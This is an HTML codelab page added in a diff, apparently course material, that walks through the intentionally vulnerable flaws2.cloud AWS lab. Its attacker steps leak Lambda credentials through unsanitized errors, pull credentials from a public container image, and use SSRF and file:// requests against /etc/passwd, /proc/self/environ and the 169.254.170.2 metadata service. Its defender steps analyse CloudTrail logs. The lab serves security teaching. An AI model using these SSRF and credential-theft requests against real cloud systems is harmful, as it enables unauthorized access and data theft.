@@ -1,0 +1,349 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>8.2: flaws2.cloud</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W8.2_aws_flaws2" title="8.2: flaws2.cloud" environment="web" feedback-link="https://docs.google.com/document/d/1joRqUHIdKA7dtjUdTUnD1fpM5inT1XzJJdMJg54rNbI">
+<google-codelab-step label="Introduction" duration="2">
+<p>The complexity of cloud-based applications can lead to a vast number of security issues. To show how these issues can occur, Summit Route&#39;s <code>flaws</code> exercises contain an intentionally vulnerable set of cloud deployments on AWS that users can exploit to gain unauthorized access. </p>
+<h2 is-upgraded><strong>What you will</strong> do</h2>
+<p>In this codelab, we will walk-through how to exploit each deployment. </p>
+<h2 class="checklist" is-upgraded><strong>What you&#39;ll learn</strong></h2>
+<ul class="checklist">
+<li>How to leverage vulnerabilities in cloud applications to gain unauthorized access to resources</li>
+</ul>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>An account on <a href="https://www.awseducate.com/" target="_blank">AWS</a></li>
+<li>A machine with the <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a> and <code>jq</code> installed</li>
+</ul>
+<h2 is-upgraded>Installing <strong><code>jq</code></strong></h2>
+<ul>
+<li>Within AWS Cloud Shell you can use <code>yum</code> to install <code>jq</code>.</li>
+</ul>
+<pre><code>sudo yum install jq</code></pre>
+<ul>
+<li>If using the AWS CLI on Ubuntu, the commands to install <code>jq</code> are</li>
+</ul>
+<pre><code>sudo apt update -y
+sudo apt install jq -y</code></pre>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Attacker: Level 1" duration="10">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>Navigate to the <a href="http://flaws2.cloud/" target="_blank">http://flaws2.cloud/</a> website and read the overview. Then click <a href="http://level1.flaws2.cloud/" target="_blank">Attacker!</a></p>
+<p>This level contains two application vulnerabilities that allow an attacker to then pivot to gain unauthorized access to cloud resources of the project. As a result of over-provisioned privileges in the infrastructure running the application, a compromise of the application then leads to extensive access to backend resources (e.g. storage buckets)</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>The form asks for a PIN code that is 100 digits long.</p>
+<p class="image-container"><img style="width:444px" src="img/453c4156b452ba87.png"></p>
+<p>It performs input validation on the client-side via JavaScript. Unfortunately, it doesn&#39;t perform a similar one on the server-side. </p>
+<p>Examine the form element to reveal the backend URL that handles the form submission then inject a non-numeric code.</p>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>The backend URL is implemented as a serverless function (e.g. Lambda). The second application vulnerability is that the application function for handling the submission doesn&#39;t sanitize error messages. When given unexpected input, it coughs up the environment variables being used to execute the function: something commonly done for debugging purposes. It is an extremely common occurrence for debugging information to be left in the application when deployed.</p>
+<p class="image-container"><img style="width:624px" src="img/1c851d39c7128130.png"></p>
+<p class="image-container"><img style="width:624px" src="img/c2ac393bab60131c.png"></p>
+<p>From the error messages, one can pull out the &#34;keys to the kingdom&#34;, the AWS credentials associated with the account running the Lambda. This allows one to take on any role that has been assigned to the account.</p>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Using the AWS CLI, one can then use these compromised credentials to list all of the S3 storage buckets the account has access to. There are two ways to leverage the credentials given. The first is to use shell environment variables to set the default credentials the AWS CLI uses and then list the contents of the level&#39;s bucket.</p>
+<pre><code>export AWS_ACCESS_KEY_ID=ASIA...643 
+export AWS_SECRET_ACCESS_KEY=1jxi...o4u
+export AWS_SESSION_TOKEN=IQoJ...Vi8
+aws s3 ls s3://level1.flaws2.cloud</code></pre>
+<p>The second way is to leverage support from the AWS CLI for multiple profiles. Profiles are stored in <code>~/.aws/credentials</code> with each profile labeled in square brackets with their name. An example profile named <code>'level1'</code> that contains the credentials obtained is shown below. </p>
+<pre><code>[level1]
+aws_access_key_id = ASIA...643
+aws_secret_access_key = 1jxi...o4u
+aws_session_token = IQoJ...Vi8</code></pre>
+<p>We will be using this second way for specifying credentials for the rest of the examples. </p>
+<h2 is-upgraded><strong>Step 4:</strong></h2>
+<p>After creating this profile, we can now learn more about the credentials we&#39;ve just obtained. On AWS, short-term tokens are typically issued to temporarily authenticate requests using AWS&#39;s Secure Token Service (STS). Since the prior step has given us access to a token, we can use an STS command to identify the AWS Account being used to run the entire site.</p>
+<ul>
+<li><strong>Take a screenshot showing this account via the command below</strong></li>
+</ul>
+<pre><code>aws sts get-caller-identity --profile level1</code></pre>
+<h2 is-upgraded><strong>Step 5:</strong></h2>
+<p>We can use the credentials to then to list the contents of the bucket servicing the level. </p>
+<pre><code>aws s3 ls s3://level1.flaws2.cloud --profile level1</code></pre>
+<h2 is-upgraded><strong>Step 6:</strong></h2>
+<p>From here, we see a secret HTML file in the bucket and can copy it to our local machine. </p>
+<pre><code>aws s3 cp s3://level1.flaws2.cloud/secret-ppxV...Nco.html --profile level1 .</code></pre>
+<ul>
+<li><strong>Take a screenshot showing the secret URL in the file</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Attacker: Level 2" duration="10">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>This level runs a container that uses HTTP authentication to protect against unauthorized access. Unfortunately, if the credentials are stored in the image itself and the image is accessible, one can easily obtain the necessary credentials.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>This level runs a container that uses HTTP authentication to protect against unauthorized access. If the credentials that are being verified by the container are stored in the container&#39;s image itself, then it is imperative that the container image be kept secret (and not be made public)</p>
+<p class="image-container"><img style="width:434px" src="img/1272e5f6bff2212e.png"></p>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>AWS hosts a container registry service Elastic Container Registry that is similar to DockerHub and is accessed from the CLI via <code>'ecr'</code>. The repository image is given to you as <code>'level2'</code>. One can use the AWS CLI to list all of the images in the repository that are public.</p>
+<pre><code>aws ecr list-images --repository-name level2 --region us-east-1 --profile level1</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>The prior command uncovers a container image that has been made public in <code>level2</code>&#39;s repository. We can check to see if this is the container that is being used to run the site by pulling the container from the registry and examining it locally. In order to do so, we pull the information from the Elastic Container Registry service. Note that the AWS Account ID is used as the registry ID.</p>
+<pre><code>aws ecr batch-get-image --profile level1 --repository-name level2 --registry-id 653711331788 --region us-east-1 --image-ids imageTag=latest | jq &#39;.images[].imageManifest | fromjson&#39;</code></pre>
+<p>The command returns all of the different image layers for the containers in the registry. We can get download URLs for individual layers using the following command. </p>
+<pre><code>aws ecr get-download-url-for-layer  --profile level1 --repository-name level2 --registry-id 653711331788 --region us-east-1 --layer-digest &#34;sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621&#34;</code></pre>
+<p>We can then download the layer via <code>curl</code>. Note the use of the quotes to escape out the special characters in the download URL.</p>
+<pre><code>curl &#34;&lt;Download Link&gt;&#34;</code></pre>
+<p>Examine the downloaded layer. As pulling the layer shows, all of the commands used to initially create the base container state are listed, including a command that sets up HTTP Basic Authentication (as we have identified earlier). This command <code>'htpasswd'</code> takes in two arguments: a user name and password. Use these to log into the web site and finish the level.</p>
+<ul>
+<li><strong>Take a screenshot of the successful login.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Attacker: Level 3" duration="10">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>The container in the previous level contains a proxy function that allows one to include a URL that the proxy will access and return the content from. This type of proxy is prone to server-side forgery attacks. When the URL points to sensitive locations only intended to be accessed internally, compromises can occur. This level demonstrates the issue by walking you through how credentials can be obtained via rogue requests to internal Metadata services that hold account credentials.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Access the proxy to have it retrieve <a href="http://google.com" target="_blank">http://google.com</a> </p>
+<pre><code>http://container.target.flaws2.cloud/proxy/http://google.com</code></pre>
+<p><br>It is possible for one to include a <code>file:///</code> URI to see whether the proxy is vulnerable to a local file include attack.</p>
+<ul>
+<li><strong>To test this, take a screenshot of the output when using the request below</strong></li>
+</ul>
+<pre><code>http://container.target.flaws2.cloud/proxy/file:///etc/passwd</code></pre>
+<p><br>In Linux sensitive process information can be accessed via <code>/proc</code> in the file system. The symbolic link <code>'self'</code> points to the current PID that one is attempting to access information from. Point the URI to the one below.</p>
+<pre><code>http://container.target.flaws2.cloud/proxy/file:///proc/self/environ</code></pre>
+<ul>
+<li><strong>Take a screenshot of the environment variables for the process running the container.</strong></li>
+</ul>
+<p> Make a note of the variables specific to AWS.</p>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>The environment variables include <code>ECS_CONTAINER_METADATA_URI</code> which points to the location where Metadata for the container are stored. For containers running on AWS&#39;s Elastic Container Service (ECS), the Metadata service resides on a private IP address that is not globally routable and cannot be reached directly from external networks. Unfortunately, we have a proxy that we can trick that will access this internal service. The URI of the internal service&#39;s resources should have a format similar to below:</p>
+<pre><code>http://169.254.170.2/v3/c880...5a1</code></pre>
+<ul>
+<li><strong>Use the proxy to access the contents of the URI above and take a screenshot of its output.</strong></li>
+</ul>
+<p>The environment variables also include <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code> which gives the path to where the credentials are stored for the container on the Metadata service. Using this variable, construct a full URL to send to the proxy to obtain the credentials of the container. </p>
+<pre><code>http://169.254.170.2/v2/credentials/9c34...4e6</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Go back to the AWS CLI and use these credentials to create another profile called <code>level3</code> in <code>~/.aws/credentials</code></p>
+<pre><code>[level3]
+aws_access_key_id = ASIA...JAG
+aws_secret_access_key = PmWs...Ws
+aws_session_token = FwoG...w==</code></pre>
+<p>Use the profile to list all of the buckets the container has access to </p>
+<pre><code>aws s3 ls --profile level3</code></pre>
+<p>The buckets listed correspond to the URLs for each level. Visit the last URL.</p>
+<ul>
+<li><strong>Take a screenshot of the site. </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 1" duration="5">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>The Defender path of flaws2.cloud allows one to simulate an incident responder to the events generated on the Attacker path. The first objective is to access the CloudTrail log files collected during the attack.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>The credentials for the Defender are given at <a href="http://flaws2.cloud/defender.htm" target="_blank">http://flaws2.cloud/defender.htm</a>. Create a profile called <code>security</code> with them in <code>~/.aws/credentials</code></p>
+<pre><code>[security]
+aws_access_key_id = AKIAIUFNQ2WCOPTEITJQ
+aws_secret_access_key = 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</code></pre>
+<p>The profile&#39;s default settings can be specified in another file at <code>~/.aws/config</code>. Specify a region and an output format for aws command by including the following in the file:</p>
+<pre><code>[profile security]
+region=us-east-1
+output=json</code></pre>
+<ul>
+<li><strong>Take a screenshot of the caller identity associated with these credentials via AWS&#39;s Security Token Service (STS) using the command below:</strong></li>
+</ul>
+<pre><code>aws sts get-caller-identity --profile security</code></pre>
+<p>The credentials belong to a &#34;security role&#34; which is provisioned to allow someone to perform forensics on the attack (and hopefully nothing else!). Note that this account has a different number than the compromised one (322079859186). One can issue a short-term token from these credentials using STS.</p>
+<ul>
+<li><strong>Take a screenshot of the token issued by using the command below</strong></li>
+</ul>
+<pre><code>aws sts get-session-token --profile security</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>Then, use the profile to list the storage buckets accessible.</p>
+<pre><code>aws s3 ls --profile security</code></pre>
+<p>Copy the contents of the bucket locally. </p>
+<pre><code>aws s3 sync s3://&lt;bucket&gt; . --profile security</code></pre>
+<p>The CloudTrail logs are located within the bucket and are given in a gzipped json format.</p>
+<pre><code>AWSLogs/&lt;Target_AWS_Account_ID&gt;/CloudTrail/&lt;region&gt;/&lt;year&gt;/&lt;month&gt;/&lt;day&gt;</code></pre>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 2" duration="5">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>The Defender has an AWS Account ID (322079859186) that is different from the AWS Account ID of the compromised site (653711331788). The compromised site has granted the Defender permissions to access its resources in order to investigate. This is done via a specified role in the target.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Configure another profile that is derived from the previous credentials, but specify a role within the target for the profile to take on (e.g. <code>target_security</code>). In the <code>~/.aws</code> directory, there is a file which configures each profile specified in the credentials file called <code>config</code>. (e.g. <code>~/.aws/config</code>). Use the following to allow one to use the <code>target_security</code> profile to take on the specific role in the target.</p>
+<pre><code>[profile target_security]
+region=us-east-1
+output=json
+source_profile = security
+role_arn = arn:aws:iam::653711331788:role/security</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<ul>
+<li><strong>Show the output of the following commands that use STS to show what the profiles correspond to and the AWS accounts the roles assigned are associated with.</strong></li>
+</ul>
+<pre><code>aws sts get-caller-identity --profile security
+
+aws sts get-caller-identity --profile target_security</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Using the target_security profile, repeat the last step of the Attacker path by showing the buckets in the target account.</p>
+<pre><code>aws s3 ls --profile target_security</code></pre>
+<ul>
+<li><strong>Take a screenshot of the buckets listed </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 3" duration="10">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>We can now parse the CloudTrail logs using the JSON tool <code>jq</code>.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Go into the directory that contains the gzipped JSON log files and <code>gunzip</code> them.</p>
+<pre><code>cd ~/AWSLogs/.../11/28
+gunzip *.gz</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>Each file contains log entries in JSON. Examine any file with and without the help of <code>jq</code></p>
+<pre><code>cat 6537...yXY.json
+ 
+cat 6537...yXY.json | jq &#39;.&#39;</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p><code>jq</code> allows you to filter the data based on fields specified. Specify that you only wish to see <code>eventNames</code> via </p>
+<pre><code>cat *.json | jq &#39;.Records[]|.eventName&#39;</code></pre>
+<h2 is-upgraded><strong>Step 4:</strong></h2>
+<p>Specifying timestamp output and sorting the records allows one to obtain a more useful output for forensic analysis.</p>
+<pre><code>cat *.json | jq -cr &#39;.Records[]|[.eventTime, .eventName]|@tsv&#39; | sort</code></pre>
+<h2 is-upgraded><strong>Step 5:</strong></h2>
+<p>Finally, we can output identity and network address information to more fully detail the events.</p>
+<ul>
+<li><strong>Take a screenshot of the last 10 output lines of the following.</strong></li>
+</ul>
+<pre><code>cat *.json | jq -cr &#39;.Records[]|[.eventTime, .sourceIPAddress, .userIdentity.arn, .userIdentity.accountId, .userIdentity.type, .eventName]|@tsv&#39; | sort</code></pre>
+<ul>
+<li><strong>Given the commands you invoked as the Attacker, which IP address do these logs reveal was the source of the attack?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 4" duration="5">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>From the log entries, zero in on the event associated with the theft of credentials.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>From the log files, identify the event that lists buckets in the project.</p>
+<pre><code>cat *.json | jq &#39;.Records[]|select(.eventName==&#34;ListBuckets&#34;)&#39;</code></pre>
+<ul>
+<li><strong>Show the IP address the event was triggered from as well as the tool used to initiate the event (via the </strong><strong><code>userAgent</code></strong><strong> field).</strong></li>
+</ul>
+<p>The name of the role that has been used to perform this action is also returned.</p>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>Use the role obtained in the previous step to examine the policies attached to it.</p>
+<pre><code>aws iam get-role --role-name level3 --profile target_security</code></pre>
+<p>In examining the statement associated with the attached policy as well as the description supplied,</p>
+<ul>
+<li><strong>What service is this role meant to be used with? Is it compatible with what you discovered via the </strong><strong><code>userAgent</code></strong><strong> field in the previous step?</strong></li>
+</ul>
+<p>Inconsistencies in how credentials are intended to be used versus how they are actually used are good identifiers for hacking activity in cloud deployments. As the flaws2.cloud site points to, this can be detected and reported <a href="https://www.youtube.com/watch?v=pagHGaercLs" target="_blank">automatically</a>.</p>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 5" duration="5">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>One of the problematic issues in the target&#39;s setup is that it exposed layers of its container image to the attacker. In general, enumerating all resources in a project that have been left publicly accessible is a good practice. Tools such as <a href="https://github.com/duo-labs/cloudmapper" target="_blank">CloudMapper</a> as pointed out by the flaws2.cloud site are helpful for doing this. We will use the aws command line to view the policies attached to the target&#39;s resources in order to identify policies that have resulted in this compromise.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Recall the Attacker used the <code>aws ecr</code> command to perform the <code>ListImages</code>, <code>BatchGetImage</code>, and <code>GetDownloadUrlForLayer</code> functions. We can examine the repository policy that allowed these commands to execute via the command below:</p>
+<pre><code>aws ecr get-repository-policy --repository-name level2 --profile target_security</code></pre>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>The policy is embedded as a JSON object. We can format it more nicely by passing this output to <code>jq</code> </p>
+<pre><code>aws ecr get-repository-policy --profile target_security --repository-name level2 | jq &#39;.policyText|fromjson&#39;</code></pre>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>The policy contains an <code>Effect</code> which is typically either <code>Allow</code> or <code>Deny</code>, a <code>Principal</code> that identifies whom to apply the policy towards, and a set of <code>Action</code>s the policy pertains to.</p>
+<ul>
+<li><strong>Explain who is allowed to perform what actions on the </strong><strong><code>level2</code></strong><strong> repository with this policy.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="flaws2 Defender: Objective 6" duration="10">
+<h2 is-upgraded><strong>Overview</strong></h2>
+<p>Log files can be viewed in any number of ways. One way is to place the files in an S3 bucket, then use AWS Athena to support SQL queries on top of the files. We will perform a similar forensic analysis using Athena that we have just done with <code>jq</code>.</p>
+<h2 is-upgraded><strong>Step 1:</strong></h2>
+<p>Visit the S3 home page from the console.</p>
+<p class="image-container"><img style="width:389px" src="img/10b662e61edd4be3.png"></p>
+<p>Create a bucket called &#34;<code>flaws2</code>&lt;<code>OdinID</code>&gt;&#34; where <code>OdinID</code> is your PSU username. </p>
+<p class="image-container"><img style="width:163px" src="img/9cf46845f55f33eb.png"></p>
+<h2 is-upgraded><strong>Step 2:</strong></h2>
+<p>Go to the Athena home page the console (via the search UI if you have difficulty finding it)<br><img style="width:370px" src="img/b2bd59107b945c16.png"></p>
+<p>Click on &#34;Get Started&#34;. Set the query result location in Amazon S3 to the bucket you just created (e.g. <code>s3://flaws2wuchang/</code>). If you have already visited Athena, you can also set the query result location via the &#34;Settings&#34; within Athena as shown below:</p>
+<p class="image-container"><img style="width:253px" src="img/92d064246de82d1b.png"></p>
+<p class="image-container"><img style="width:624px" src="img/6bff78ba9f2d10a0.png"></p>
+<p>Then in the query editor, run the command to create a database in Athena.</p>
+<pre><code>create database flaws2;</code></pre>
+<p>Note that if you&#39;re using the AWS classroom account (in My Classrooms), you may get an error from attempting to perform this command. Ensure you are logged into the AWS Educate Starter account instead.</p>
+<h2 is-upgraded><strong>Step 3:</strong></h2>
+<p>Use the created database:</p>
+<p class="image-container"><img style="width:253px" src="img/611040d23963e963.png"></p>
+<p>Then, run the query to create a table that contains the schema for the logs that you&#39;ve been given and set the location of the logs to the bucket the log files were obtained from (<code>s3://flaws2-logs/..</code>) </p>
+<pre><code>CREATE EXTERNAL TABLE `cloudtrail`(
+    `eventversion` string COMMENT &#39;from deserializer&#39;, 
+    `useridentity` struct&lt;type:string,principalid:string,arn:string,accountid:string,invokedby:string,accesskeyid:string,username:string,sessioncontext:struct&lt;attributes:struct&lt;mfaauthenticated:string,creationdate:string&gt;,sessionissuer:struct&lt;type:string,principalid:string,arn:string,accountid:string,username:string&gt;&gt;&gt; COMMENT &#39;from deserializer&#39;, 
+    `eventtime` string COMMENT &#39;from deserializer&#39;, 
+    `eventsource` string COMMENT &#39;from deserializer&#39;, 
+    `eventname` string COMMENT &#39;from deserializer&#39;, 
+    `awsregion` string COMMENT &#39;from deserializer&#39;, 
+    `sourceipaddress` string COMMENT &#39;from deserializer&#39;, 
+    `useragent` string COMMENT &#39;from deserializer&#39;, 
+    `errorcode` string COMMENT &#39;from deserializer&#39;, 
+    `errormessage` string COMMENT &#39;from deserializer&#39;, 
+    `requestparameters` string COMMENT &#39;from deserializer&#39;, 
+    `responseelements` string COMMENT &#39;from deserializer&#39;, 
+    `additionaleventdata` string COMMENT &#39;from deserializer&#39;, 
+    `requestid` string COMMENT &#39;from deserializer&#39;, 
+    `eventid` string COMMENT &#39;from deserializer&#39;, 
+    `resources` array&lt;struct&lt;arn:string,accountid:string,type:string&gt;&gt; COMMENT &#39;from deserializer&#39;, 
+    `eventtype` string COMMENT &#39;from deserializer&#39;, 
+    `apiversion` string COMMENT &#39;from deserializer&#39;, 
+    `readonly` string COMMENT &#39;from deserializer&#39;, 
+    `recipientaccountid` string COMMENT &#39;from deserializer&#39;, 
+    `serviceeventdetails` string COMMENT &#39;from deserializer&#39;, 
+    `sharedeventid` string COMMENT &#39;from deserializer&#39;, 
+    `vpcendpointid` string COMMENT &#39;from deserializer&#39;)
+ROW FORMAT SERDE 
+    &#39;com.amazon.emr.hive.serde.CloudTrailSerde&#39; 
+STORED AS INPUTFORMAT 
+    &#39;com.amazon.emr.cloudtrail.CloudTrailInputFormat&#39; 
+OUTPUTFORMAT 
+   &#39;org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat&#39;
+LOCATION
+    &#39;s3://flaws2-logs/AWSLogs/653711331788/CloudTrail&#39;;</code></pre>
+<h2 is-upgraded><strong>Step 4:</strong></h2>
+<p>Run a SQL query on the cloudtrail table created to list the events that have been reported:</p>
+<pre><code>select eventtime, eventname from cloudtrail;</code></pre>
+<ul>
+<li><strong>Show the output of the query</strong></li>
+</ul>
+<p>Then, run a SQL query to find the count of each event in the logs</p>
+<pre><code>SELECT 
+    eventname,
+    count(*) AS mycount 
+FROM cloudtrail 
+GROUP BY eventname 
+ORDER BY mycount;</code></pre>
+<ul>
+<li><strong>Show the output of the query.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Congratulations" duration="1">
+<p>You&#39;ve completed the flaws2 lab.</p>
+<h2 class="checklist" is-upgraded><strong>What we&#39;ve covered</strong></h2>
+<ul class="checklist">
+<li>Input validation vulnerabilities</li>
+<li>Unsanitized error messages</li>
+<li>Overly privileged resource access policies</li>
+<li>Open container images</li>
+<li>Local file inclusion attacks</li>
+<li>Server-side Request Forgery Attacks</li>
+<li>Metadata access issues</li>
+<li>Log-file analysis via command-line tools</li>
+<li>Log-file analysis via querying tools</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
